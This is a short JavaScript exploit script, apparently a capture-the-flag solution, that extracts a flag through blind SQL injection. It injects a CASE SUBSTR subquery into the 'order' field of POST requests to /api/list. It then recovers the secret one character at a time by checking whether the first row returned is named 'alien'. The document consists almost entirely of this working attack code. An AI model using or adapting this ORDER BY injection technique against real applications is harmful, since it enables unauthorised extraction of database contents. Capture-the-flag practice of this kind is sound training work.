
var aval = ['_', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '}'];

function looper(_prefix) {
  let l = _prefix.length + 1;
  for (let each of aval) {
    fetch("/api/list", {
      "credentials": "omit",
      "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/json",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
      },
      "referrer": "http://localhost:1337/",
      "body": "{\"order\":\"( CASE SUBSTR((SELECT flag FROM flag_6c733bdf43),1," + l + ") WHEN '" + _prefix + each + "' THEN name else count END) ASC\"}",
      "method": "POST",
      "mode": "cors"
    }).then((resp) => resp.json()
    ).then((resp) => {
      if (resp[0].name === 'alien') {
        console.log('!!!!FOUND IT!!!!', _prefix, each);
        looper(_prefix + each);
      }
    }).catch(() => {
      console.error('err err. BREAK the loop');
    });
  }
}

looper('CHTB{');
// flag_6c733bdf43 -- fake
// flag_fbf27277dc



